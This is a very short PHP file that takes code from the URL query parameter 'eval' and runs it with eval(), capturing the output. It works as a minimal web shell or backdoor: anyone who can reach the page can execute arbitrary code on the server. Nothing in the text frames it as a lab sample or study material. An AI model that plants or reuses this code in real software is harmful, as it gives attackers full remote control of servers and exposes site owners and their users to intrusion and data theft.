<?php
$eval = $_GET['eval'];
ob_clean();
eval($eval);
$ret = ob_get_contents();
?>